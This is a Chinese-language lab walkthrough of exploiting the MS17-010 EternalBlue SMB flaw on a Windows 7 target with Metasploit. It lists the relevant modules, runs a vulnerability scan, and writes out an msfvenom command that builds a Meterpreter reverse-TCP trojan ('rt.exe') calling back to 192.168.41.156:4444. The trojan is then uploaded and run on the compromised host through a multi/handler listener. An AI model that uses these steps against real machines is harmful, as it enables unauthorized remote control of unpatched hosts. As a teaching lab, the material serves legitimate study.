### MS17-010 永恒之蓝（MSF）

MS17-010 是 Windows SMBv1 服务器处理特殊 SMB 报文时的内核级内存处理缺陷（导致内存越界/内存破坏），攻击者可借此实现**任意内存写/远程代码执行（RCE）**，在受害机器上以 **SYSTEM（内核/系统）权限**执行代码

环境准备：一台 KaliLinux（攻击者）和一台 Windwos 7（靶标）

![](https://pic1.imgdb.cn/item/68cb5f73c5157e1a8813c541.png)

![](https://pic1.imgdb.cn/item/68bf54b358cb8da5c88af3bc.png)

启动 MSF

![](https://pic1.imgdb.cn/item/68cac8d3c5157e1a8812f53b.png)

搜索漏洞利用模块

```
search ms17-010
```

![](https://pic1.imgdb.cn/item/68cb5fa4c5157e1a8813c6b0.png)

```
exploit/windows/smb/ms17_010_eternalblue
```

- 描述：针对 MS17-010 的 EternalBlue 利用（Windows 内核池损坏/远程代码执行）
- Rank: average（中等）
- `Check: Yes`：模块提供 `check`，可探测目标是否易受攻击（但 `check` 不是 100% 准确）
- 适配面：列出的 target（Windows 7/8/8.1/Server2008R2/2012/10 等）表示模块含多平台/版本的 exploitation 变体或偏好
- 使用场景：对未打补丁的 SMBv1 服务直接利用以触发内核漏洞（通常需要合适的 payload，且常见于 64/32 位差异）

```
exploit/windows/smb/ms17_010_psexec
```

- 描述：利用 EternalRomance/EternalSynergy/EternalChampion（也是一组 NSA 泄露的 SMB 利用）实现远程代码执行，使用类似 psexec 的上传/执行方式（可上传可执行/PowerShell/MOF）
- Rank: normal（普通）
- `Check: Yes`
- 备注：此模块不一定是直接的内核链触发，而是利用另外相关的 SMB 漏洞链来实现文件上传并执行（类似 psexec 工作流）。列出 target：Automatic、PowerShell、Native upload、MOF upload —— 表示模块支持多种执行载体

```
auxiliary/admin/smb/ms17_010_command
```

- 描述：对 MS17-010 相关链的“命令执行”辅助模块（通常直接执行命令而不是打开完整 shell），`Check: No`
- 适用：当你只想远程执行单条命令（而不植入持久 payload）时使用

```
auxiliary/scanner/smb/smb_ms17_010
```

- 描述：扫描/检测目标是否存在 MS17-010 相关的易受攻击性（检测模块）
- `Check: No`（是扫描模块，不是 exploit 的 check）
- AKA: DOUBLEPULSAR / ETERNALBLUE（只是说明检测对象相关）
- 用法：先用该模块或 nmap 脚本确认哪些主机有漏洞，再决定是否尝试 exploit

```
exploit/windows/smb/smb_doublepulsar_rce
```

- 描述：针对已植入 DoublePulsar (黑客后门/内存-based SMB implant) 的远程代码执行模块。Rank: great（很高）
- 说明：DoublePulsar 本身常作为后门/网传载体被植入在被攻陷主机上。该模块有两个 target：执行 payload (x64) 或 “Neutralize implant” —— 后者用于清除 implant（中和/移除 DoublePulsar）

`use 数字`，先使用探测模块

![](https://pic1.imgdb.cn/item/68cb631ec5157e1a8813dd36.png)

查看参数

![](https://pic1.imgdb.cn/item/68cb6439c5157e1a8813ec5e.png)

设置目标后运行发现存在漏洞

![](https://pic1.imgdb.cn/item/68cb64d2c5157e1a8813f49f.png)

切换为攻击模块提示使用 payload

![](https://pic1.imgdb.cn/item/68cb64f8c5157e1a8813f6b4.png)

查看 payloads

![](https://pic1.imgdb.cn/item/68cb653ac5157e1a8813fa4d.png)

查看参数

![](https://pic1.imgdb.cn/item/68cb65a3c5157e1a8814001c.png)

设置目标 IP 后运行

![](https://pic1.imgdb.cn/item/68cb65edc5157e1a8814043d.png)

输入 help 查看帮助

![](https://pic1.imgdb.cn/item/68cb6618c5157e1a88140698.png)

退出并保存会话

![](https://pic1.imgdb.cn/item/68cb6722c5157e1a881418da.png)

生成反弹 Shell 程序

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.41.156 LPORT=4444 -f exe > rt.exe
```

`msfvenom`：Metasploit 的 payload 生成器（生成 raw shellcode 或封装到可执行文件/脚本等）

`-p windows/x64/meterpreter/reverse_tcp`：指定 payload（这里是 x64 Meterpreter 反连 TCP）

`LHOST=192.168.41.156`：payload 连接回你的监听主机（你的 IP，目标必须能访问到这个地址）

`LPORT=4444`：监听端口（payload 反连到这个端口）

`-f exe`：输出格式为 Windows 可执行文件（PE exe）

`> rt.exe` 或 `-o rt.exe`：将输出写入文件 `rt.exe`

加载一个通用的 **handler** 模块，用来接收来自各种反连（reverse）payload 的回连（session）

```sh
use exploit/multi/handler
```

![](https://pic1.imgdb.cn/item/68cb7faec5157e1a8814c887.png)

设置反连的 payload 类型

`set payload ...` 命令告诉当前已加载的 `exploit/multi/handler` 模块：**它要接收的**（也就是你将生成并在目标上运行的）payload 类型是 `windows/x64/meterpreter/reverse_tcp`

![](https://pic1.imgdb.cn/item/68cb802bc5157e1a8814cf65.png)

设置参数后运行

![](https://pic1.imgdb.cn/item/68cb80f4c5157e1a8814da05.png)

上传木马文件

![](https://pic1.imgdb.cn/item/68cb8134c5157e1a8814dd54.png)

在被控主机上以当前 meterpreter 进程的权限创建并运行名为 `rt.exe` 的可执行程序

![](https://pic1.imgdb.cn/item/68cb828cc5157e1a8814ef54.png)

查看进程

![](https://pic1.imgdb.cn/item/68cb835ac5157e1a8814fa16.png)

成功连接

![](https://pic1.imgdb.cn/item/68cb82b0c5157e1a8814f145.png)